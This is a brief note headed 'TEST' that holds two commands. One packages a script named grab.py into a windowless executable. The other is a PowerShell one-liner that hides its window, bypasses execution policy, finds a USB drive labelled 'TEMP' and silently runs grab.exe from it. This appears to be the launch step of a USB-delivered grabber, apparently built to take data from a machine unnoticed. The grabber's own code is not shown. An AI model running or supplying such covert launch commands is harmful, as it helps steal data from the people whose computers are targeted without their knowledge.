**TEST**

pyinstaller -F --noconsole -i NONE grab.py

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "$usbDrive = (Get-WmiObject -Query 'SELECT * FROM Win32_Volume WHERE Label = ''TEMP''').DriveLetter + '\'; Set-Location -Path \"$usbDrive\dist\"; .\\grab.exe"
